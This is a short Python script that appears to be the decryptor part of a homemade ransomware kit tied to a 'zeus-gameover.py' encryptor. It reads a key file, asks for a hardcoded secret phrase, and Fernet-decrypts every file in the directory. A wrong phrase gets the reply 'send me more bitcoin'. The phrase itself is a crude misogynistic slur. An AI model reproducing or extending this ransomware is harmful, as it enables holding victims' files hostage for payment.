import os
from cryptography.fernet import Fernet

files = []

#print all the files in your system
for file in os.listdir():
    if file == "zeus-gameover.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretphrase = "4doors_more_whores"
user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase:
    #encrpt the files
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
            print("congrats, you're files are decrypted.")
else:
    print("sorry, wrong pharse send me more bitcoin!!")